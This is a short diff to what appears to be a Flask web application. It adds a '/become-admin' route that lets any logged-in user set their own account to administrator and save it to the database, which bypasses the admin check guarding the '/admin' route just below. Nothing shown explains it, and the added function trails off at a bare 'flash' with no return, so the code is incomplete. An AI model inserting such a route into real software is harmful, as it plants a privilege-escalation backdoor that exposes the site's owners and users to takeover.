@@ -292,6 +292,13 @@ def admin_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+@app.route("/become-admin")
+@login_required
+def become_admin():
+    current_user.is_admin = True
+    db.session.commit()
+    flash
+    
 @app.route("/admin")
 @login_required
 @admin_required
